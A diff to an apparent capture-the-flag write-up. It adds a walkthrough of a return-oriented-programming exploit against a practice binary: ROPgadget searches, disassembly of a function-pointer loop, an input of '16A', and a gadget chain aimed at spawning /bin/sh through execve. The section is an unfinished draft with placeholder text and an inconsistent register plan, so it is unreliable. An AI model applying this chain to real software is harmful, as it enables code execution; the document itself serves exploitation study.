@@ -11,21 +11,7 @@ execve("/bin/sh", NULL, NULL)
 
 ## challenge 1
 
-the decompiled code of the vulnerable function looks something like:
-
-__int64 sub_401510()
-{
-  int v0; // ebx
-  char nptr[272]; // [rsp+8h] [rbp-110h] BYREF
-
-  puts("Enter id:");
-  gets(nptr);
-  v0 = strtol(nptr, 0, 10);
-  puts("Enter password:");
-  return gets(&nptr[16 * v0 + 8]);
-}
-
-also, there's a null terminated string "/bin/sh" at address 0x402004:
+there's a null terminated string "/bin/sh" at address 0x402004:
 
 ``` plaintext
 Contents of section .rodata:
@@ -87,3 +73,76 @@ we'll just pass the first function:
 
 ## challenge 2
 
+the decompiled code of the main program looks somehting like this:
+
+we can see that the while loop just executes every function pointer if its not null in the array that starts at v3-1024
+also v3-1024 is written to in vuln_overflow. we can write gadget addresses to the v3-1024 buffer to manipulate the program.
+
+we will again use ROP gadgets to achieve the execution of syscall with rax = 59
+let's find some stuff that will do at least something related to 59 or 0x3b
+
+ROPgadget --binary ./exploitme-safestack | grep "0x3b"
+
+we see a lot of gadgets but particularly interesting is:
+
+0x0000000000402bd0 : add rax, 0x3b ; ret
+
+it's very clean and it does almost what we need. we just need to find somehting to set rax to zero before executing this gadget
+
+ROPgadget --binary ./exploitme | grep "rax"
+
+we see:
+
+0x0000000000402b90 : xor rax, rax ; ret
+
+this gadget sets rax to 0. in combination with the previous gadget we can pass the execve syscall number to rax
+
+now let's see what gadgets there are for the syscall instruction:
+
+ROPgadget --binary ./exploitme-safestack | grep "syscall"
+
+0x0000000000402c66 : xor rsi, rsi ; xor rdx, rdx ; syscall
+
+we see the same compound gadget from the last challenge. we'll use it to actually perform the syscall
+
+we need to load the address of the c-string /bin/sh to rdi. we notice that the functions:
+
+0x0000000000402b10 <g_sh@@Base>:
+0x0000000000402b10 <g_sh2@@Base>:
+0x0000000000402b10 <g_sh3@@Base>:
+
+all do that.
+
+``` asm
+402f00: 49 ff c4              inc    r12
+402f03: 49 81 fc 80 00 00 00  cmp    r12,0x80
+402f0a: 74 1e                 je     402f2a <main@@Base+0x7a>
+402f0c: 4b 83 bc e7 00 fc ff  cmp    QWORD PTR [r15+r12*8-0x400],0x0
+402f13: ff 00 
+402f15: 74 e9                 je     402f00 <main@@Base+0x50>
+402f17: 48 89 de              mov    rsi,rbx
+402f1a: 43 ff 94 e7 00 fc ff  call   QWORD PTR [r15+r12*8-0x400]
+402f21: ff 
+402f22: 48 89 df              mov    rdi,rbx
+402f25: 48 89 c3              mov    rbx,rax
+402f28: eb d6                 jmp    402f00 <main@@Base+0x50>
+```
+
+(explanation why id needs to be 16 to write at r15 in main's unsafe stack)
+
+having found all of the gadgets, we can proceed to compile our payload.
+
+the id should just get the number 16, so we will just pass it:
+
+b"16A"
+
+this way, the second gets will start to write in the previous unsafe stack frame.
+
+0x0000000000402b90 : xor rax, rax ; ret
+0x0000000000402bd0 : add rax, 0x3b ; ret
+0x0000000000402b40 : mov rdx, rax ; ret
+0x0000000000402b10 : mov into rax the address of "/bin/sh"
+0x0000000000402b70 : mov rax, rdx ; ret
+0x0000000000402c66 : xor rsi, rsi ; xor rdx, rdx ; syscall
+
+## challenge 3
